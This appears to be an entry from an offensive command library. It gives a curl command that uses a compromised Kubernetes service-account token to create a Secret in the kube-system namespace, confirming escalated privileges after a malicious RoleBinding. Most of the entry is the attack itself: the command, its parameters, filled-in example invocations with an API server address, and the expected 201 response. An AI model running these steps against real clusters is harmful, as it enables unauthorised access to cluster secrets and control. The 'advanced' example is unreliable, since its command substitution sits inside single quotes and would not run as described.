---
id: b826bebd-7839-407c-94fa-fcbb1d1df1c9
name: curl-create-kube-system-secret
type: command
executor: bash
data: >-
  curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED_JWT_TOKEN>" -H
  "Content-Type: application/json"
  https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets -d
  '{"apiVersion":"v1","kind":"Secret","metadata":{"name":"test-malicious-secret"},"data":{}}'
output: null
created_at: '2023-04-06T03:56:01.304901+00:00'
updated_at: '2023-04-10T20:34:00.645334+00:00'
platforms:
  - Kubernetes
tags:
  - rbac
  - privilege-escalation
  - post-exploitation
verified: true
validated: true
---

# curl-create-kube-system-secret

## Command

```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED_JWT_TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets -d '{"apiVersion":"v1","kind":"Secret","metadata":{"name":"test-malicious-secret"},"data":{}}'
```

## Description

This command uses curl to create a test secret in the Kubernetes kube-system namespace, verifying elevated privileges gained via a RoleBinding. It authenticates with a compromised service account's JWT token and posts a minimal secret manifest directly in the request body.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| <COMPROMISED_JWT_TOKEN> | JWT token of the escalated service account | Yes |
| <master_ip> | IP address of the Kubernetes API server | Yes |
| <port> | Port of the API server (default 6443) | Yes |
| -d '...' | Inline JSON for the Secret manifest (name and empty data) | Yes |
| -k | Skip SSL certificate verification | No |
| -v | Verbose output | No |

## Examples

### Basic Usage

```bash
curl -k -v -X POST -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..." -H "Content-Type: application/json" https://192.168.1.100:6443/api/v1/namespaces/kube-system/secrets -d '{"apiVersion":"v1","kind":"Secret","metadata":{"name":"test-secret"},"data":{}}'
```

### Advanced Usage

Create a secret with base64-encoded data:

```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED_JWT_TOKEN>" -H "Content-Type: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets -d '{"apiVersion":"v1","kind":"Secret","metadata":{"name":"malicious-secret"},"data":{"key":"$(echo -n "value" | base64)"}}'
```

## Expected Output

Successful creation returns HTTP 201 Created with the Secret resource:

```
{
  "apiVersion": "v1",
  "data": {},
  "kind": "Secret",
  "metadata": {
    "creationTimestamp": "2023-04-06T03:56:01Z",
    "name": "test-malicious-secret",
    "namespace": "kube-system",
    "resourceVersion": "67890",
    "uid": "def456-ghi789"
  },
  "type": "Opaque"
}
```
A 403 Forbidden error pre-escalation confirms the need for the RoleBinding.

## Related

- [[procedures/kubernetes-rbac-privilege-escalation-via-malicious-rolebinding]]
- [[commands/curl-create-malicious-rolebinding]]
